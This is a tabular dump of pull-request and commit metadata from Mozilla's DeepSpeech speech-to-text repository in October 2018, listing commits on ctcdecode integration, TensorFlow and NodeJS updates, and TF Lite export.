2704,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cc9b3711dc0da2b650325b582cd88ebc8828c88,Use ctcdecode in native client
2705,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b29d0abb1e66de1445f136af7ee304a4ee01456a,"Make trie parameter optional, building it on demand if not passed"
2706,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,200e61e5a84de4793f0ecb2c539f402683ac28d6,Add libdl and pthread to linkopts
2707,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,70ff71c4c503e17b3777124d62bb4f9af3aab831,Switch native tests to ctcdecode trie and prodmodel
2708,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,58b25da29b5a968f0bdc2681dda2f20684a3c6ca,Fix libstdc++ versioning error on ARM
2709,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf57453beb84f9e9d29155927bf3c3120b996c28,Fix signature of ctc_beam_search_decoder_batch
2710,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db3a36c36bdc0aaa2b7279bb27b0a85bc5cba98a,Remove leftover hack making Scorer members public
2711,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa6434b27d47ded32748bbc0d892ff410a3ae60b,"Revert ""Make trie parameter optional, building it on demand if not passed""

This reverts commit b29d0abb1e66de1445f136af7ee304a4ee01456a."
2712,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,68258e356c43bf83afa9f4604ecd7487f4ac743a,Address review comments
2713,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5536e5440ee3cf7ea133c003b09f6a3ee8592d71,Introduce NodeJS v11.x
2714,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23497fde41e6e76d4a452fd9ebcfae8b31b3d5ad,Use unique_ptr for Scorer members
2715,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,01291591f8f2e2e3d5b3be5fd2a1c8b0dc79a4f9,"Merge pull request #1685 from lissyx/node-v11

Introduce NodeJS v11.x"
2716,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3860f63a3e8f1bd530f668a2290ee20708affd2,"Merge pull request #1679 from mozilla/ctcdecode

Use ctcdecode in native client (Fixes #1668)"
2717,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d30afdbad77084b090aecbf21bd78c551406671,Training and directly exporting as TF Lite
2718,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,46767efa5059cda3e22fa8ccb0b53951da616d64,"Merge pull request #1687 from lissyx/export-tflite

Training and directly exporting as TF Lite"
2719,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1688,1688,Update tf master,,lissyx,1645737,2018-10-30T19:13:17Z,COLLABORATOR,True,198550,233,532,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0eb224b0690bdb2efb3480eb16f2d44f7ca5d83,Merge remote-tracking branch 'upstream/master' into update-tf-master
2720,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1687,1687,Training and directly exporting as TF Lite,,lissyx,1645737,2018-10-30T09:33:53Z,COLLABORATOR,True,123,34,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d30afdbad77084b090aecbf21bd78c551406671,Training and directly exporting as TF Lite
2721,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1686,1686,Merge master 20181029,,lissyx,1645737,2018-10-29T14:56:40Z,COLLABORATOR,True,28,30,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1540fa392e4aa64c5a74124a0dd4fd57c993b6f0,Remove old AOT model
2722,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1686,1686,Merge master 20181029,,lissyx,1645737,2018-10-29T14:56:40Z,COLLABORATOR,True,28,30,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4869474456f95500a171e0e8219a736d2b07d539,Remove deprecated python deps
2723,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1686,1686,Merge master 20181029,,lissyx,1645737,2018-10-29T14:56:40Z,COLLABORATOR,True,28,30,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6296b5cb5494f22f9c051256c9932fd1e9565a72,Update Python and NodeJS to their latest versions
2724,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1686,1686,Merge master 20181029,,lissyx,1645737,2018-10-29T14:56:40Z,COLLABORATOR,True,28,30,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,65deefe173b2cf11bb9171de1906a18f9a7cedcd,Update pyenv for newer CPython
2725,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1686,1686,Merge master 20181029,,lissyx,1645737,2018-10-29T14:56:40Z,COLLABORATOR,True,28,30,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b06c98198a8efeb7b1e53f65f7191ecf79424fef,"Merge pull request #1683 from lissyx/cleanup

Cleanup"
2726,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1686,1686,Merge master 20181029,,lissyx,1645737,2018-10-29T14:56:40Z,COLLABORATOR,True,28,30,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06a956607eb97da28f6d9393ccdaef91d1e83cf4,Merge remote-tracking branch 'upstream/master' into merge-master-20181029
2727,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1686,1686,Merge master 20181029,,lissyx,1645737,2018-10-29T14:56:40Z,COLLABORATOR,True,28,30,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,756533060ad91f4bbd8c79ad95c380777a7cb0a3,Update TensorFlow master
2728,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1685,1685,Introduce NodeJS v11.x,,lissyx,1645737,2018-10-26T20:12:57Z,COLLABORATOR,True,162,13,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5536e5440ee3cf7ea133c003b09f6a3ee8592d71,Introduce NodeJS v11.x
2729,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1683,1683,Cleanup,,lissyx,1645737,2018-10-26T13:10:15Z,COLLABORATOR,True,9,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1540fa392e4aa64c5a74124a0dd4fd57c993b6f0,Remove old AOT model
2730,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1683,1683,Cleanup,,lissyx,1645737,2018-10-26T13:10:15Z,COLLABORATOR,True,9,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4869474456f95500a171e0e8219a736d2b07d539,Remove deprecated python deps
2731,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1683,1683,Cleanup,,lissyx,1645737,2018-10-26T13:10:15Z,COLLABORATOR,True,9,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6296b5cb5494f22f9c051256c9932fd1e9565a72,Update Python and NodeJS to their latest versions
2732,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1683,1683,Cleanup,,lissyx,1645737,2018-10-26T13:10:15Z,COLLABORATOR,True,9,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,65deefe173b2cf11bb9171de1906a18f9a7cedcd,Update pyenv for newer CPython
2733,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1682,1682,Time pyenv install makeopts,,lissyx,1645737,2018-10-26T08:48:23Z,COLLABORATOR,False,6,6,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a5d63ad8d362f05345173d171533f8956884667,Add time to 'pyenv install'
2734,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1682,1682,Time pyenv install makeopts,,lissyx,1645737,2018-10-26T08:48:23Z,COLLABORATOR,False,6,6,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6db292cb1ff8f97e923569992d653c019bbebe9f,"Add MAKE_OPTS=""-j12"" to pyenv install"
2735,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1681,1681,Add time to 'pyenv install',,lissyx,1645737,2018-10-26T08:46:37Z,COLLABORATOR,False,6,6,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dfba773ad228aa95427f69b02265f38827ecca4e,Add time to 'pyenv install'
2736,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06d4379994452e7eb72c839508f185b2ebc32b86,Fix docstrings that were being missed by Sphinx
2737,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e00c63c0a8028d32bae30e68bc461478f486e535,Fix evaluate.py to handle compact format in cached features
2738,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed489b1112d093d2aed2b696c522d85cc64a46f2,Remove useless bogus cURL call
2739,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,963edc12deeaa9d2307c3c352d7471a97057e6f2,"Merge pull request #1644 from lissyx/fix-dockerbuild

Remove useless bogus cURL call"
2740,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c38dc099d36fd593c0ff27e475014bf72a32c94e,Fixed #1638 (Update Hyperparameters for 0.3.0)
2741,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e33e5eedde7e3ee5a9695be27a6ce3bed78b1ea0,"Merge pull request #1642 from mozilla/issue1637

Fix evaluate.py to handle compact format in cached features"
2742,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9fa29935cfe2c6da489cd2a9e55dd02e08afc6b8,"Merge pull request #1639 from mozilla/issue1638

Fixed #1638 (Update Hyperparameters for 0.3.0)"
2743,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fbf61cd6c7e0cbdb1c49b3794298e5477794b92,"Bump to v0.3.0-alpha.1

X-DeepSpeech: NOBUILD"
2744,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6baf3a9c3ffc1cd6f385e20a40cbaa3f79ea0aa6,"Merge pull request #1646 from lissyx/bump-v0.3.0-alpha.1

Bump to v0.3.0-alpha.1"
2745,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,609120f3da80d9622fc14803b05faf4bf476013a,"[TrainingSpeech importer] stick to data/alphabet.txt

aims to generate english-complatible dataset since no FR alphabet.txt for now
see https://github.com/mozilla/DeepSpeech/pull/1599#issuecomment-426544379 for more info"
2746,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,285efcf23154cd043da6dd8ce63893544edbfb89,Merge branch 'master' of github.com:nicolaspanel/DeepSpeech
2747,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61d9193ce52503b52954736d1e60761c32d0b339,[TrainingSpeech importer] add `--english-compatible` option
2748,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,55fb2305e22b4d98e421ec360d55b1016e7004d3,"Merge pull request #1611 from daanzu/pr-docs

Fix docstrings that were being missed by Sphinx"
2749,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5118f7ffed4ff92f76f4cf02a0881aa7c96147da,"Merge pull request #1647 from nicolaspanel/master

[TrainingSpeech importer] generate english-complatible dataset"
2750,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,111262a3ec3c1fe1ebe0b8d414cede81e6f23864,Fixed #1649 (Update README's for 0.3.0)
2751,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c7e6759293159bc957269dd74d7d6da890fd0fb1,"Merge pull request #1650 from mozilla/issue1649

Fixed #1649 (Update README's for 0.3.0)"
2752,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32a75d1d9d81abc3e23d51a7a0cd658e324d21c4,Avoid task_TIMESTAMP use on macOS generic-worker
2753,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6f9a60967b2586eedfbc9d962496084c7b65050,Update TensorFlow r1.11
2754,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d5275059564af7ef5e93974f959f34fc2aa89ba,"Merge pull request #1651 from lissyx/stable-tc-workdir

Stable tc workdir"
2755,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,529ebdfcb4507c7ced8f42b2d386b8a780a39551,"Fix import_cv.py

I have no idea how this ever worked"
2756,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7ba814b22cba90c5023f4dae4c4658f4251f1f2e,"Merge pull request #1663 from faissaloo/patch-1

Add missing import of progressbar module to import_cv.py"
2757,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,46b327a3d9a5ab57ddbe74d81eefe989bf6c6014,Bump VERSION to v0.3.0
2758,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ef6b5bd4707ca5042c04f07236cd3f028d279b26,"Merge pull request #1667 from lissyx/bump-v0.3.0

Bump v0.3.0"
2759,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,46d1cece4f98d726d88579500734a95686cfe16b,Remove initialize_from_frozen_model flag and support code
2760,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f11ccbe39bfe98e8ab88807f80eaa27c44983eb8,"Merge pull request #1661 from mozilla/remove-init-frozen-model

Remove initialize_from_frozen_model flag and support code (Fixes #1659)"
2761,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4be9364c364ce6bbe83847530da4d2e0265d88a1,Force HOMEBREW_NO_AUTO_UPDATE=1 to avoid magic autoupdate of brew
2762,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae5303e130acaa41e4ee81b17a197e6a119110bb,Update TensorFlow r1.11
2763,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc9b6e3c2cd12e85273c1a529b89a8d94367c6bb,Export trained model before testing with checkpoint
2764,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29e9dcd974eaf048a67c7d60f0f92218954ccd27,"Merge pull request #1677 from lissyx/r1.11-brew

R1.11 brew"
2765,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1680,1680,Update tf master,,lissyx,1645737,2018-10-25T13:54:29Z,COLLABORATOR,True,188,168,35,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db08bad707f20a362a3848e760b6184a7060a1ca,Merge remote-tracking branch 'upstream/master' into update-tf-master
2766,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c34fc5b7ac9fdeae656f7098947b25c8264fa647,Import parlance/ctcdecode into repository
2767,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0002d0feedbe003cf8c799719a44bd73857cb831,Integrate ctcdecode into build system
2768,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
